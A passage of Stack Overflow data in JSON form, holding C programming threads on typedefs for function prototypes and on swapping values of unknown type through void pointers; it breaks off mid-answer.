90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 3, "creation_date": 1518635269, "post_id": 48794475, "comment_id": 84591191, "body": "It simply <i>can&#39;t</i> be used in a definition. But at least you get the compiler to check your functions match the expected prototype before you convert to a pointer. That&#39;s neat, isn&#39;t it?"}, {"owner": {"reputation": 61555, "user_id": 648658, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/75ee864ee3bef78f2a144398789fed25?s=128&d=identicon&r=PG", "display_name": "Jens", "link": "https://stackoverflow.com/users/648658/jens"}, "edited": false, "score": 2, "creation_date": 1518635296, "post_id": 48794475, "comment_id": 84591214, "body": "The macro solution is the way to go. If you are afraid of the preprocessor, you are either poisoned by C++ or need anxiety therapy :-)"}, {"owner": {"reputation": 3975, "user_id": 8513665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c39368317b0749f5d8f09735796c470e?s=128&d=identicon&r=PG&f=1", "display_name": "Christian Gibbons", "link": "https://stackoverflow.com/users/8513665/christian-gibbons"}, "reply_to_user": {"reputation": 61555, "user_id": 648658, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/75ee864ee3bef78f2a144398789fed25?s=128&d=identicon&r=PG", "display_name": "Jens", "link": "https://stackoverflow.com/users/648658/jens"}, "edited": false, "score": 1, "creation_date": 1518635328, "post_id": 48794475, "comment_id": 84591234, "body": "@Jens Not mutually exclusive."}, {"owner": {"reputation": 149, "user_id": 9044058, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-HEzy8U74ggI/AAAAAAAAAAI/AAAAAAAAACc/cPdRypDPESI/photo.jpg?sz=128", "display_name": "tehftw", "link": "https://stackoverflow.com/users/9044058/tehftw"}, "reply_to_user": {"reputation": 61555, "user_id": 648658, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/75ee864ee3bef78f2a144398789fed25?s=128&d=identicon&r=PG", "display_name": "Jens", "link": "https://stackoverflow.com/users/648658/jens"}, "edited": false, "score": 0, "creation_date": 1518635469, "post_id": 48794475, "comment_id": 84591309, "body": "@Jens: It&#39;s both actually(my first language was C++), plus I want everything I can to be kept as the C code, and only use preprocessor for things that can&#39;t be done in code(like #include and guarding headers)."}, {"owner": {"reputation": 149, "user_id": 9044058, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-HEzy8U74ggI/AAAAAAAAAAI/AAAAAAAAACc/cPdRypDPESI/photo.jpg?sz=128", "display_name": "tehftw", "link": "https://stackoverflow.com/users/9044058/tehftw"}, "reply_to_user": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 0, "creation_date": 1518635608, "post_id": 48794475, "comment_id": 84591373, "body": "@StoryTeller I don&#39;t exactly understand what you are trying to say. Do you mean how I define a &quot;double function(args)&quot; after declaring it as &quot;MathFunction function&quot;? Though that leaves the problem of the &quot;MathFunction_pointer&quot; being defined separately from &quot;MathFunction&quot;."}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 0, "creation_date": 1518635674, "post_id": 48794475, "comment_id": 84591416, "body": "I mean that the approach that lets you &quot;save a few keystrokes&quot; is actually a fair bit more then you give it credit for."}, {"owner": {"reputation": 149, "user_id": 9044058, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-HEzy8U74ggI/AAAAAAAAAAI/AAAAAAAAACc/cPdRypDPESI/photo.jpg?sz=128", "display_name": "tehftw", "link": "https://stackoverflow.com/users/9044058/tehftw"}, "edited": false, "score": 0, "creation_date": 1518636304, "post_id": 48794475, "comment_id": 84591731, "body": "Please confirm if I&#39;m understanding it correctly. Do you mean, that my approach of &quot;saving a few keystrokes&quot; has the benefit of checking the types of the function pointers?"}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1518636470, "post_id": 48794475, "comment_id": 84591816, "body": "Did you look into <a href=\"http://ocaml.org/\" rel=\"nofollow noreferrer\">Ocaml</a>? You might find it interesting!"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1518638063, "post_id": 48794475, "comment_id": 84592686, "body": "As OP is interested in &quot;save a few keystrokes&quot;. note that the <a href=\"https://en.wikipedia.org/wiki/Don%27t_repeat_yourself#DRY_vs_WET_solutions\" rel=\"nofollow noreferrer\">WET</a> 2nd <code>const</code> in <code>double mathFunction_1(const double *values,  &#47;* here *&#47; const size_t array_length);</code> serve no functional purpose.  Same effect as <code>double mathFunction_1(const double *values,  size_t array_length);</code>"}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 1, "creation_date": 1518638183, "post_id": 48794475, "comment_id": 84592743, "body": "@tehftw - I mean that it both expresses intent/usage and allows the compiler to check it for correctness. Imagine a better type name. Imagine you are declaring a <code>UIActionFunction my_cb;</code>. It says what that function will be. It conveys more than just a bunch of parameters and a return type. The compiler will check the definition against it (as it would for any prototype). But if you need to change what a <code>UIActionFunction</code> is, then all the places in the code will be highlighted immediately upon rebuild, for any function declared by that type alias. It&#39;s already doing quite a lot."}, {"owner": {"reputation": 25744, "user_id": 2089675, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/sBz5q.jpg?s=128&g=1", "display_name": "smac89", "link": "https://stackoverflow.com/users/2089675/smac89"}, "edited": false, "score": 0, "creation_date": 1518681066, "post_id": 48794475, "comment_id": 84607040, "body": "If only this were C++, then you can use lambdas..."}, {"owner": {"reputation": 149, "user_id": 9044058, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-HEzy8U74ggI/AAAAAAAAAAI/AAAAAAAAACc/cPdRypDPESI/photo.jpg?sz=128", "display_name": "tehftw", "link": "https://stackoverflow.com/users/9044058/tehftw"}, "edited": false, "score": 0, "creation_date": 1518711259, "post_id": 48794475, "comment_id": 84626758, "body": "Indeed, if only it wasn&#39;t my own exercise with a goal to learn about programming in the C language... Don&#39;t worry fellow human, I&#39;m generally more of a C++ background, and learn both of those amazing languages."}], "answers": [{"comments": [{"owner": {"reputation": 149, "user_id": 9044058, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-HEzy8U74ggI/AAAAAAAAAAI/AAAAAAAAACc/cPdRypDPESI/photo.jpg?sz=128", "display_name": "tehftw", "link": "https://stackoverflow.com/users/9044058/tehftw"}, "edited": false, "score": 0, "creation_date": 1518635737, "post_id": 48794534, "comment_id": 84591459, "body": "If I understand correctly - the way I did it is the preferred(correct?) way of doing things? And as long as I don&#39;t have a big list of function arguments, it should be fine?"}, {"owner": {"reputation": 15800, "user_id": 1274314, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/gSYsp.jpg?s=128&g=1", "display_name": "TypeIA", "link": "https://stackoverflow.com/users/1274314/typeia"}, "reply_to_user": {"reputation": 149, "user_id": 9044058, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-HEzy8U74ggI/AAAAAAAAAAI/AAAAAAAAACc/cPdRypDPESI/photo.jpg?sz=128", "display_name": "tehftw", "link": "https://stackoverflow.com/users/9044058/tehftw"}, "edited": false, "score": 2, "creation_date": 1518636078, "post_id": 48794534, "comment_id": 84591629, "body": "@tehftw Yes, what you are doing is just fine in my book. Using a <code>typedef</code> for pointers to functions that match a certain signature is common and accepted in C. And there is no problem with having many functions with the same signature, even if it is annoying that you have to type them all out!"}], "tags": [], "owner": {"reputation": 15800, "user_id": 1274314, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/gSYsp.jpg?s=128&g=1", "display_name": "TypeIA", "link": "https://stackoverflow.com/users/1274314/typeia"}, "is_accepted": false, "score": 3, "last_activity_date": 1518635965, "last_edit_date": 1518635965, "creation_date": 1518635334, "answer_id": 48794534, "question_id": 48794475, "link": "https://stackoverflow.com/questions/48794475/is-it-possible-to-typedefof-sorts-a-function-prototype/48794534#48794534", "title": "Is it possible to &quot;typedef&quot;(of sorts) a function prototype?", "body": "<p>Unfortunately in C I don't believe there is any way to do what you're asking without using preprocessor macros, and personally at least I agree with your assessment that they are clunky and to be avoided (though this is a matter of opinion and open to debate).</p>\n\n<p>In C++ you could potentially take advantage of <a href=\"https://isocpp.org/wiki/faq/cpp14-language#generic-lambdas\" rel=\"nofollow noreferrer\"><code>auto</code> parameters in lambdas</a>.</p>\n\n<p>The example function signatures you show here really aren't complicated and I wouldn't worry about the perceived duplication. If the signatures were much more complicated, I would view this as a \"code smell\" that your design could be improved, and I'd focus my efforts there rather than on syntactic methods to shorten the declaration. That just isn't the case here.</p>\n"}, {"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518638254, "post_id": 48794605, "comment_id": 84592777, "body": "UV for <a href=\"https://idioms.thefreedictionary.com/cover+all+the+bases\" rel=\"nofollow noreferrer\">covering all the bases</a>."}, {"owner": {"reputation": 149, "user_id": 9044058, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-HEzy8U74ggI/AAAAAAAAAAI/AAAAAAAAACc/cPdRypDPESI/photo.jpg?sz=128", "display_name": "tehftw", "link": "https://stackoverflow.com/users/9044058/tehftw"}, "edited": false, "score": 1, "creation_date": 1531065954, "post_id": 48794605, "comment_id": 89446637, "body": "Massive props and thanks to you Brasile Starynkevitch - I learned a bit Scheme is an amazing language, especially GNU Guile and Racket inmplementations. Overall, your answer is way more than I expected, which is awesome."}], "tags": [], "owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "is_accepted": false, "score": 8, "last_activity_date": 1518639973, "last_edit_date": 1518639973, "creation_date": 1518635689, "answer_id": 48794605, "question_id": 48794475, "link": "https://stackoverflow.com/questions/48794475/is-it-possible-to-typedefof-sorts-a-function-prototype/48794605#48794605", "title": "Is it possible to &quot;typedef&quot;(of sorts) a function prototype?", "body": "<p>You could use a <code>typedef</code>  for the signature (see also <a href=\"https://stackoverflow.com/a/9143434/841108\">this</a>):</p>\n\n<pre><code>typedef double MathFunction_ty (const double *, const size_t);\n</code></pre>\n\n<p>and then <em>declare</em> several functions of the same signature:</p>\n\n<pre><code>MathFunction_ty func1, func2;\n</code></pre>\n\n<p>or declare some function <em>pointer</em> using that:</p>\n\n<pre><code>MathFunction_ty* funptr;\n</code></pre>\n\n<p>etc... All this in <a href=\"https://en.wikipedia.org/wiki/C11_(C_standard_revision)\" rel=\"nofollow noreferrer\">C11</a>, read <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow noreferrer\">n1570</a>.</p>\n\n<blockquote>\n  <p>however the definition has to be fully typed out.</p>\n</blockquote>\n\n<p>Of course, since you need to give a <em>name</em> to each formal parameter (and such names are <em>not</em> part of the type of the function) in the function's <em>definition</em>. Therefore</p>\n\n<pre><code>double func1(const double*p, const size_t s) {\n  return (double)s * p[0];\n}\n</code></pre>\n\n<p>and</p>\n\n<pre><code>double func1(cont double*arr, const size_t ix) {\n   return arr[ix];\n}\n</code></pre>\n\n<p>have the <em>same</em> type (the one denoted by <code>MathFunction_ty</code> above), even if their formal parameters (or formal arguments) are named differently.</p>\n\n<p>You might abuse of the preprocessor and have an ugly macro to shorten the <em>definition</em> of such functions:</p>\n\n<pre><code>// ugly code:\n#define DEFINE_MATH_FUNCTION(Fname,Arg1,Arg2) \\\n   double Fname (const double Arg1, const size_t Arg2)\nDEFINE_MATH_FUNCTION(func1,p,s) { return (double)s * p[0]; }\n</code></pre>\n\n<p>I find such code confusing and unreadable. I don't recommend coding like that, even if it is certainly possible. But sometimes I do code something similiar (for <em>other</em> reasons).</p>\n\n<p><sup>(BTW, imagine if C <em>required</em> every first formal argument to be named <code>$1</code>, every second formal argument to be named <code>$2</code>, etc...; IMHO that would make a much less readable programming langage; so formal parameter's name matters to the human reader, even if systematic names would make the compiler's life simpler)</sup> </p>\n\n<p>Read also about  <a href=\"https://en.wikipedia.org/wiki/Lambda_calculus\" rel=\"nofollow noreferrer\">\u03bb-calculus</a>, <a href=\"https://en.wikipedia.org/wiki/Anonymous_function\" rel=\"nofollow noreferrer\">anonymous functions</a> (C don't have them but C++ has <a href=\"http://en.cppreference.com/w/cpp/language/lambda\" rel=\"nofollow noreferrer\">lambda expressions</a>), <a href=\"https://en.wikipedia.org/wiki/Closure_(computer_programming)\" rel=\"nofollow noreferrer\">closures</a> (they are <em>not</em> C functions, because they have closed values so mix code with data; C++ has <a href=\"http://en.cppreference.com/w/cpp/utility/functional/function\" rel=\"nofollow noreferrer\"><code>std::function</code></a>-s), <a href=\"https://en.wikipedia.org/wiki/Callback_(computer_programming)\" rel=\"nofollow noreferrer\">callbacks</a> (a necessary <em>convention</em> to \"mimick\" closures)... Read <a href=\"https://mitpress.mit.edu/sicp/\" rel=\"nofollow noreferrer\">SICP</a>, it will improve your thinking about C or C++. Look also into <a href=\"https://stackoverflow.com/a/29427906/841108\">that</a> answer.</p>\n"}, {"tags": [], "owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "is_accepted": false, "score": 1, "last_activity_date": 1518678500, "last_edit_date": 1518678500, "creation_date": 1518676255, "answer_id": 48801151, "question_id": 48794475, "link": "https://stackoverflow.com/questions/48794475/is-it-possible-to-typedefof-sorts-a-function-prototype/48801151#48801151", "title": "Is it possible to &quot;typedef&quot;(of sorts) a function prototype?", "body": "<p>Yes, you can.  Indeed, that's the purpose of the <code>typedef</code> declaration, to use a type identifier to declare a type of variable.  The only thing is that when you use such a declaration in a header file:</p>\n\n<pre><code> typedef int (*callback_ptr)(int, double, char *);\n</code></pre>\n\n<p>and then you declare something like:</p>\n\n<pre><code> callback_ptr function_to_callback;\n</code></pre>\n\n<p>it's not clear that you are declaring a function pointer and the number and type of the parameters, but despite of this, everything is correct.</p>\n\n<p>Finally, I want to note you something particularly special.   When you deal with something like this, it is normally far cheaper and quick to go to the compiler and try some example.  If the compiler does what you want without any complaint, the most probable thing is that you are correct.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n\ntypedef double (*ptr_to_mathematical_function)(double);\n\nextern double find_zero(ptr_to_mathematical_function f, double aprox_a, double aprox_b, double epsilon);\n\nint main()\n{\n#define P(exp) printf(#exp \" ==&gt; %lg\\n\", exp)\n\n    P(find_zero(cos, 1.4, 1.6, 0.000001));\n    P(find_zero(sin, 3.0, 3.2, 0.000001));\n    P(find_zero(log, 0.9, 1.5, 0.000001));\n}\n\ndouble find_zero(\n    ptr_to_mathematical_function f, \n    double a, double b, double eps)\n{\n    double f_a = f(a), f_b = f(b);\n    double x = a, f_x = f_a;\n\n    do {\n        x = (a*f_b - b*f_a) / (f_b - f_a);\n        f_x = f(x);\n\n        if (fabs(x - a) &lt; fabs(x - b)) {\n           b = x; f_b = f_x;\n        } else {\n            a = x; f_a = f_x;\n        }\n    } while(fabs(a-b) &gt;= eps);\n    return x;\n}\n</code></pre>\n\n<p>The second, and main part of your question, if you are having such a problem, the only way you can solve it is via using macros (see how I repeated the above <code>printf(3)</code> function calls with similar, but not identical parameter lists, and how the problem is solved below):</p>\n\n<pre><code>#define MY_EXPECTED_PROTOTYPE(name) double name(double x)\n</code></pre>\n\n<p>and then, in the definitions, just use:</p>\n\n<pre><code>MY_EXPECTED_PROTOTYPE(my_sin) {\n    return sin(x);\n}\n\nMY_EXPECTED_PROTOTYPE(my_cos) {\n    return cos(x);\n}\n\nMY_EXPECTED_PROTOTYPE(my_tan) {\n    return tan(x);\n}\n...\n</code></pre>\n\n<p>that will expand to:</p>\n\n<pre><code>double my_sin(double x) {\n...\ndouble my_cos(double x) {\n...\ndouble my_tan(double x) {\n...\n</code></pre>\n\n<p>you can even use it in the header file, like:</p>\n\n<pre><code>MY_EXPECTED_PROTOTYPE(my_sin);\nMY_EXPECTED_PROTOTYPE(my_cos);\nMY_EXPECTED_PROTOTYPE(my_tan);\n</code></pre>\n\n<p>As it has been pointed in other answers, there are other languages (C++) that give support for this and much more, but I think this is out of scope here.</p>\n"}], "owner": {"reputation": 149, "user_id": 9044058, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-HEzy8U74ggI/AAAAAAAAAAI/AAAAAAAAACc/cPdRypDPESI/photo.jpg?sz=128", "display_name": "tehftw", "link": "https://stackoverflow.com/users/9044058/tehftw"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 503, "favorite_count": 0, "answer_count": 3, "score": 6, "last_activity_date": 1518678500, "creation_date": 1518635100, "last_edit_date": 1518637890, "question_id": 48794475, "link": "https://stackoverflow.com/questions/48794475/is-it-possible-to-typedefof-sorts-a-function-prototype", "title": "Is it possible to &quot;typedef&quot;(of sorts) a function prototype?", "body": "<p>I have multiple functions that are similar to each other - they take in the same arguments, and return the same type:</p>\n\n<pre><code>double mathFunction_1(const double *values, const size_t array_length);\n</code></pre>\n\n<p>I already use typedef'd pointers to those functions, as I store them as an array to easily use any number of them on the same data, map them etc.:</p>\n\n<pre><code>typedef double (* MathFunction_ptr )(const double *, const size_t);\n\ndouble proxy(MathFunction_ptr mathfun_ptr, const double *values, const size_t array_length);\n</code></pre>\n\n<p>What I want to achieve, is a similar ease-of-use with declaring and defining the functions, as I already have with using pointers to them.</p>\n\n<hr>\n\n<p>Thus, I was thinking about using a similar typedef to make it easier for me to write the actual functions. I tried doing it like this:</p>\n\n<pre><code>// declaration\ntypedef double MathFunction (const double *values, const size_t array_length);\nMathFunction mathFunction_2;\n</code></pre>\n\n<p>The following approach works partially. It lets me \"save a few keystrokes\" in the declaration, however the definition has to be fully typed out.</p>\n\n<pre><code>double mathFunction_2(const double *values, const size_t array_length)\n{\n    // ...\n}\n</code></pre>\n\n<hr>\n\n<p>What I found by searching more for this issue is this: <a href=\"https://stackoverflow.com/questions/4574985/can-a-function-prototype-typedef-be-used-in-function-definitions\">Can a function prototype typedef be used in function definitions?</a> </p>\n\n<p>However it doesn't provide many alternatives, and only reaffirms that what I tried to do in my other experiments is forbidden according to the Standard. The only alternative it provides is using</p>\n\n<pre><code>#define FUNCTION(name) double name(const double* values, size_t array_length)\n</code></pre>\n\n<p>which sounds clunky to me(as I'm wary and skeptical of using the preprocessor).</p>\n\n<p>What are the alternatives to what I'm trying to do?</p>\n\n<hr>\n\n<p>Two other approaches I tried that don't work(and, as I just read, are forbidden and absolutely wrong according to the C standard 6.9.1):</p>\n\n<p>1.This approach doesn't work, as it means that I'm telling it to define a variable mathFunction_2(I believe that variable is treated as a pointer, though I don't understand this well enough yet) like a function: </p>\n\n<pre><code>MathFunction mathFunction_2\n{\n    // ...\n}\n</code></pre>\n\n<p>2.This approach doesn't work, as it means I'm telling it to create a function which returns a function(unacceptable in the C language):</p>\n\n<pre><code>MathFunction mathFunction_2()\n{\n    // ...\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 3, "creation_date": 1518634868, "post_id": 48794397, "comment_id": 84590981, "body": "What if it&#39;s <i>smaller</i>?"}, {"owner": {"reputation": 6567, "user_id": 2435820, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/J6uQT.png?s=128&g=1", "display_name": "kfx", "link": "https://stackoverflow.com/users/2435820/kfx"}, "edited": false, "score": 0, "creation_date": 1518634941, "post_id": 48794397, "comment_id": 84591017, "body": "<i>2 numeric number</i> - you mean &quot;binary number&quot;?"}, {"owner": {"reputation": 131, "user_id": 9268588, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/25114647b854c5a9f410a84b2963b9ba?s=128&d=identicon&r=PG&f=1", "display_name": "Dean Movy", "link": "https://stackoverflow.com/users/9268588/dean-movy"}, "edited": false, "score": 0, "creation_date": 1518634963, "post_id": 48794397, "comment_id": 84591033, "body": "i also try it with int and this works"}, {"owner": {"reputation": 131, "user_id": 9268588, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/25114647b854c5a9f410a84b2963b9ba?s=128&d=identicon&r=PG&f=1", "display_name": "Dean Movy", "link": "https://stackoverflow.com/users/9268588/dean-movy"}, "edited": false, "score": 0, "creation_date": 1518635007, "post_id": 48794397, "comment_id": 84591051, "body": "@secs ago: no, just any number (same type)"}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 1, "creation_date": 1518635010, "post_id": 48794397, "comment_id": 84591053, "body": "<i>It works</i> by sheer luck. Try a more complicated program."}, {"owner": {"reputation": 6567, "user_id": 2435820, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/J6uQT.png?s=128&g=1", "display_name": "kfx", "link": "https://stackoverflow.com/users/2435820/kfx"}, "edited": false, "score": 0, "creation_date": 1518635123, "post_id": 48794397, "comment_id": 84591116, "body": "I don&#39;t this is possible in the general case, without knowing the type or size of the numbers. Is this an interview question? Are you sure it has a solution?"}, {"owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "edited": false, "score": 1, "creation_date": 1518635129, "post_id": 48794397, "comment_id": 84591117, "body": "There&#39;s no good way to do this without passing the size of the inputs as a third parameter (like with <code>qsort</code>, for example).  Otherwise you&#39;re just guessing, which is guaranteed to cause mayhem at some point.  If you want to cheat, you can create a global that stores the size and reference that in the function, but that&#39;s a bad approach."}, {"owner": {"reputation": 131, "user_id": 9268588, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/25114647b854c5a9f410a84b2963b9ba?s=128&d=identicon&r=PG&f=1", "display_name": "Dean Movy", "link": "https://stackoverflow.com/users/9268588/dean-movy"}, "edited": false, "score": 1, "creation_date": 1518635257, "post_id": 48794397, "comment_id": 84591182, "body": "This is homework"}, {"owner": {"reputation": 15260, "user_id": 1968182, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/E5nF2.jpg?s=128&g=1", "display_name": "Ulrich Eckhardt", "link": "https://stackoverflow.com/users/1968182/ulrich-eckhardt"}, "edited": false, "score": 4, "creation_date": 1518635405, "post_id": 48794397, "comment_id": 84591263, "body": "Then, don&#39;t paraphrase the actual task but repeat it verbatim. Also, be prepared to answer that a solution can not be given, with a sufficient justification, of course."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1518637638, "post_id": 48794397, "comment_id": 84592440, "body": "The code does not have any <code>long double</code> and you have misread the book: <code>%1f</code> (one-eff) should be <code>%lf</code> (ell-eff). However the <code>double</code> type only needs <code>%lf</code> when its address is passed to <code>scanf</code> function family. The <code>printf</code> function family promotes <code>float</code> arguments to <code>double</code> and the <code>%f</code> format is good."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1518637742, "post_id": 48794397, "comment_id": 84592491, "body": "It&#39;s possible that you&#39;re supposed to use <code>_Generic</code> to solve the problem."}], "answers": [{"comments": [{"owner": {"reputation": 131, "user_id": 9268588, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/25114647b854c5a9f410a84b2963b9ba?s=128&d=identicon&r=PG&f=1", "display_name": "Dean Movy", "link": "https://stackoverflow.com/users/9268588/dean-movy"}, "edited": false, "score": 1, "creation_date": 1518636100, "post_id": 48794551, "comment_id": 84591640, "body": "I cannot use third argument"}, {"owner": {"reputation": 6567, "user_id": 2435820, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/J6uQT.png?s=128&g=1", "display_name": "kfx", "link": "https://stackoverflow.com/users/2435820/kfx"}, "edited": false, "score": 0, "creation_date": 1518636361, "post_id": 48794551, "comment_id": 84591765, "body": "This is not an answer to the question, though."}, {"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 0, "creation_date": 1518637749, "post_id": 48794551, "comment_id": 84592495, "body": "Also, <code>sizeof</code> is a compile-time operator, and can&#39;t possibly be useful to determine what pointer type is passed to a function at runtime."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 0, "creation_date": 1518640786, "post_id": 48794551, "comment_id": 84594059, "body": "@LeeDanielCrocker Re: &quot;sizeof  ... can&#39;t possibly be useful to determine what pointer type is passed&quot;.  To swap, the type of the pointer is not important.  The size of the objects are important and that can be found with <code>sizeof</code>.  Otherwise unclear about your concern."}, {"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 0, "creation_date": 1518641078, "post_id": 48794551, "comment_id": 84594202, "body": "<code>sizeof(p)</code> inside a function that takes void pointer argument p will give you the size of the pointer. If you try sizeof(*p) it give you an error. There&#39;s no way to get the size of the thing pointed to unless you commit to it at compile time. (Or use C11 _Generic as suggested)."}], "tags": [], "owner": {"reputation": 630, "user_id": 9361705, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3480b01ac2475fdc98d6d64b1f1d6143?s=128&d=identicon&r=PG&f=1", "display_name": "John Doe", "link": "https://stackoverflow.com/users/9361705/john-doe"}, "is_accepted": false, "score": 2, "last_activity_date": 1518635820, "last_edit_date": 1518635820, "creation_date": 1518635419, "answer_id": 48794551, "question_id": 48794397, "link": "https://stackoverflow.com/questions/48794397/how-to-swap-2-numeric-numbers-of-unknown-exact-type-via-two-void-pointer-parame/48794551#48794551", "title": "How to swap 2 numeric numbers of unknown exact type, via two void pointer parameters?", "body": "<p>Your program should try to retrieve <code>sizeof</code> of its argument to know how many bytes to swap - perhaps as a third argument - you have no way of telling otherwise how big an argument is. With current function you will overwrite memory which will end up badly - especially in a bigger program. For example, consider a following program.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main() {\n    int a[] = {1, 2, 3, 4, 5, 6, 7, 8};\n    swap(&amp;a[0], &amp;a[4]);\n    for (int i = 0; i &lt; 8; i++) {\n        printf(\"%d\\n\", a[i]);\n    }\n}\n</code></pre>\n\n<p>Which will return 5, 6, 7, 8, 1, 2, 3, 